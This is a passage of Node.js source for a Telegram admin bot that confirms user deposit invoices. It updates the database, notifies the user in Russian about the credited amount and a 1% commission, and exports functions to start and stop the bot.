        await client.query('COMMIT');
        
        // Get user info for notification (outside transaction)
        const userResult = await pool.query('SELECT telegram_id, first_name FROM users WHERE id = $1', [invoice.user_id]);
        
        if (userResult.rows.length > 0) {
          const user = userResult.rows[0];
          
          // Notify user
          const { getBot } = require('./bot');
          const mainBot = getBot();
          if (mainBot) {
            let notifyText = `✅ Пополнение подтверждено!\n\n💰 Сумма: ${displayAmount}`;
            if (commission > 0) {
              const sym = creditCurrency === 'RUB' ? '₽' : creditCurrency === 'EUR' ? '€' : creditCurrency === 'BYN' ? 'Br' : 'USDT';
              notifyText += `\n💸 Комиссия 1%: ${commission.toFixed(2)} ${sym}\n💵 Зачислено: ${creditAmount.toFixed(2)} ${sym}`;
            }
            notifyText += `\n\nБаланс обновлён. Приятной торговли!`;
            await mainBot.sendMessage(user.telegram_id, notifyText);
          }
          
          // Update admin message
          const userName = user.first_name || 'Пользователь';
          bot.editMessageText(
            `✅ *Оплата подтверждена*\n\n` +
            `👤 Пользователь: ${userName}\n` +
            `🆔 Telegram ID: \`${user.telegram_id}\`\n` +
            `💵 Сумма: ${displayAmount}\n` +
            `📋 Invoice: \`${invoiceId}\``,
            {
              chat_id: chatId,
              message_id: query.message.message_id,
              parse_mode: 'Markdown'
            }
          );
        }
        
        bot.answerCallbackQuery(query.id, { text: '✅ Оплата подтверждена!' });
        
      } catch (e) {
        await client.query('ROLLBACK').catch(() => {});
        console.error('Confirm invoice error:', e);
        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка: ' + e.message });
      } finally {
        client.release();
      }
    }
  });

  bot.on('polling_error', (error) => {
    if (!isProduction) {
      console.error('Admin bot polling error:', error.message);
    }
  });
}

function stopAdminBot() {
  if (bot) {
    if (!isProduction) {
      bot.stopPolling();
    }
    console.log('🤖 Admin bot stopped');
  }
}

module.exports = { 
  initAdminBot, 
  stopAdminBot,
  processAdminUpdate,
  getAdminWebhookPath,
  getAdminBot: () => bot
};
